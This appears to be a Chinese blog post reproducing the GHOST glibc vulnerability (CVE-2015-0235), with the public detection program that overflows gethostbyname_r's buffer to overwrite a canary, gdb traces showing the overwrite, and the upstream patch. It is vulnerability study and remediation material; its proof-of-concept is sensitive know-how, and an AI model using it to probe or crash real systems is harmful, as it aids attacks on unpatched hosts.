---
layout: post
title: GHOST PoC Explained
excerpt: "CVE-2015-0235漏洞复现"
categories: [漏洞复现]
comments: true
---

验证代码：
```
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define CANARY "in_the_coal_mine"
//$1 = {buffer = "buffer", '\0' <repeats 1017 times>, canary = "in_the_coal_mine"}
struct {
    char buffer[1024];
    char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };//这个是将temp赋值

int main(void) {
    struct hostent resbuf;
    struct hostent *result;
    int herrno;
    int retval;

    /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
    size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;     //999 = 1024 -16*1 -2*4 -1   (char * 为指针，在32为中为4字节)
    char name[sizeof(temp.buffer)];//申请一个1024字节的char
    memset(name, '0', len);     // 向name前999字节复制'0'
    name[len] = '\0';           //第999字节为\0


    retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);//调用了这个有漏洞的方法,将name复制到buffer中

    if (strcmp(temp.canary, CANARY) != 0) {         //若canary中的值不等于in_the_coal_mine，则证明有漏洞
        puts("vulnerable");
        exit(EXIT_SUCCESS);
    }
    if (retval == ERANGE) {                         //若返回状态码为ERANGE(表示一个范围错误),则证明漏洞不存在
        puts("not vulnerable");
        exit(EXIT_SUCCESS);
    }
    puts("should not happen");
    exit(EXIT_FAILURE);
}
```
很明显是存在漏洞的。简单解释一下 PoC，在栈上布置一个区域 temp，由 buffer 和 canary 组成，然后初始化一个 name，最后执行函数 gethostbyname_r()，正常情况下，当把 name+*host_addr+*h_addr_ptrs+1 复制到 buffer 时，会正好覆盖缓冲区且没有溢出。然而，实际情况并不是这样。

验证：
```bash
gcc vunl.c
[root@localhost morty]# ./a.out 
vulnerable
```
在漏洞代码中，首先我们定义了CANARY, “in_the_coal_mine”，这是我们需要覆盖的目标，之后我们定义了结构体，它包含了两个chunks，这两个chunk将会被glibc的gethostbyname_r方法覆盖掉，替换成CANARY的值，第一个chunk叫buffer它的大小是1024字节，它将被gethostbyname_r方法的“buflen”参数溢出掉，紧跟着buffer chunk的是canary chunk，从buffer溢出的字节被放到了canary chunk中， Now that we have defined our struct representing the buffer for gethostname_r, the name char array is being initialized with 999 bytes of ASCII ‘0’ / HEX 0x30.

函数 gethostbyname_r() 在 include/netdb.h 中定义如下：
```
struct hostent {
    char  *h_name;            /* official name of host */
    char **h_aliases;         /* alias list */
    int    h_addrtype;        /* host address type */
    int    h_length;          /* length of address */
    char **h_addr_list;       /* list of addresses */
}
#define h_addr h_addr_list[0] /* for backward compatibility */

int gethostbyname_r(const char *name,
        struct hostent *ret, char *buf, size_t buflen,
        struct hostent **result, int *h_errnop);
```

- name：The name of the Internet host whose entry you want to find.
- ret：A pointer to a struct hostent where the function can store the host entry.
- buf：A pointer to a buffer that the function can use during the operation to store host database entries; buffer should be large enough to hold all of the data associated with the host entry. A 2K buffer is usually more than enough; a 256-byte buffer is safe in most cases.
- buflen：The length of the area pointed to by buffer.
- result：A pointer to a struct hostent where the function can store the host entry.
- h_errnop：A pointer to a location where the function can store an herrno value if an error occurs.

...

...

...

gdb开始调试

```shell
gdb -q a.out 
(gdb) b main
Breakpoint 1 at 0x80484b8: file vunl.c, line 21.
(gdb) set disassembly-flavor intel
(gdb) r
Starting program: /home/morty/a.out 

Breakpoint 1, main () at vunl.c:21
21	    size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
Missing separate debuginfos, use: debuginfo-install glibc.i686
(gdb) disass main
Dump of assembler code for function main:
0x080484a4 <main+0>:	lea    ecx,[esp+0x4]
0x080484a8 <main+4>:	and    esp,0xfffffff0
0x080484ab <main+7>:	push   DWORD PTR [ecx-0x4]
0x080484ae <main+10>:	push   ebp
0x080484af <main+11>:	mov    ebp,esp
0x080484b1 <main+13>:	push   ecx
0x080484b2 <main+14>:	sub    esp,0x454
0x080484b8 <main+20>:	mov    DWORD PTR [ebp-0x8],0x3e7
0x080484bf <main+27>:	mov    eax,DWORD PTR [ebp-0x8]
0x080484c2 <main+30>:	mov    DWORD PTR [esp+0x8],eax
0x080484c6 <main+34>:	mov    DWORD PTR [esp+0x4],0x30
0x080484ce <main+42>:	lea    eax,[ebp-0x428]
0x080484d4 <main+48>:	mov    DWORD PTR [esp],eax
0x080484d7 <main+51>:	call   0x8048388 <memset@plt>
0x080484dc <main+56>:	mov    eax,DWORD PTR [ebp-0x8]
0x080484df <main+59>:	mov    BYTE PTR [ebp+eax*1-0x428],0x0
0x080484e7 <main+67>:	lea    eax,[ebp-0x28]
0x080484ea <main+70>:	mov    DWORD PTR [esp+0x14],eax
0x080484ee <main+74>:	lea    eax,[ebp-0x24]
0x080484f1 <main+77>:	mov    DWORD PTR [esp+0x10],eax
0x080484f5 <main+81>:	mov    DWORD PTR [esp+0xc],0x400
0x080484fd <main+89>:	mov    DWORD PTR [esp+0x8],0x8049840
0x08048505 <main+97>:	lea    eax,[ebp-0x20]
0x08048508 <main+100>:	mov    DWORD PTR [esp+0x4],eax
0x0804850c <main+104>:	lea    eax,[ebp-0x428]
0x08048512 <main+110>:	mov    DWORD PTR [esp],eax
0x08048515 <main+113>:	call   0x80483a8 <gethostbyname_r@plt>
0x0804851a <main+118>:	mov    DWORD PTR [ebp-0xc],eax
0x0804851d <main+121>:	mov    DWORD PTR [esp+0x4],0x8048654
0x08048525 <main+129>:	mov    DWORD PTR [esp],0x8049c40
0x0804852c <main+136>:	call   0x80483c8 <strcmp@plt>
0x08048531 <main+141>:	test   eax,eax
0x08048533 <main+143>:	je     0x804854d <main+169>
0x08048535 <main+145>:	mov    DWORD PTR [esp],0x8048665
---Type <return> to continue, or q <return> to quit---

(gdb) b *main+113
Breakpoint 2 at 0x8048515: file vunl.c, line 26.
(gdb) c
Continuing.

Breakpoint 2, 0x08048515 in main () at vunl.c:26
26	    retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
```

查看temp

```
(gdb) print temp
$1 = {buffer = "buffer", '\0' <repeats 1017 times>, canary = "in_the_coal_mine"}
(gdb) p &temp
$2 = (struct {...} *) 0x8049840

(gdb) x/1024s 0x8049840
0x8049840 <temp>:	 "buffer"
0x8049847 <temp+7>:	 ""
0x8049848 <temp+8>:	 ""
0x8049849 <temp+9>:	 ""
0x804984a <temp+10>:	 ""
0x804984b <temp+11>:	 ""
...
...
...
0x8049c3d <temp+1021>:	 ""
0x8049c3e <temp+1022>:	 ""
0x8049c3f <temp+1023>:	 ""
0x8049c40 <temp+1024>:	 "in_the_coal_mine"
0x8049c51:	 ""
0x8049c52:	 ""
0x8049c53:	 ""
0x8049c54 <completed.5699>:	 ""
0x8049c55:	 ""
```

我们的程序中temp有两个buffer:“buffer”和“canary”，buffer的内容包括buffer的名字“buffer”6 bytes+ 1017 bytes 的 ‘0’  + null terminating byte = 1024 bytes，CANARY的位置在0x8049c40，并且在temp结构体中，初始值为 “in_the_coal_mine”

现在我们再运行一行指令，使gethostbyname_r方法被调用，然后再查看temp struct

```
(gdb) ni
(gdb) x/3s 0x8049c40
0x8049c40 <temp+1024>:	 "000"
0x8049c44 <temp+1028>:	 "he_coal_mine"
0x8049c51:	 ""
```

我们看到CANARY的值被覆盖掉了

#### 打补丁
漏洞代码的位置在`nss/digits_dots.c`补丁的内容是给size_needed增加了4字节的空间

```
vi nss/digits_dots.c

From this:
  105:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name) + 1);

  277:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name) + 1);

To this:
  105:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name)
		+ sizeof (*h_alias_ptr) + 1);

  277:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name)
		+ sizeof (*h_alias_ptr) + 1);
```

This adds the 4 missed bytes that cause the overflow from the first chunk to the next chunk. Now if we add this to the calculation of the “size_t len” from the above PoC code, instead of 999 bytes the name char array buffer will be 995 and the overflow will not work.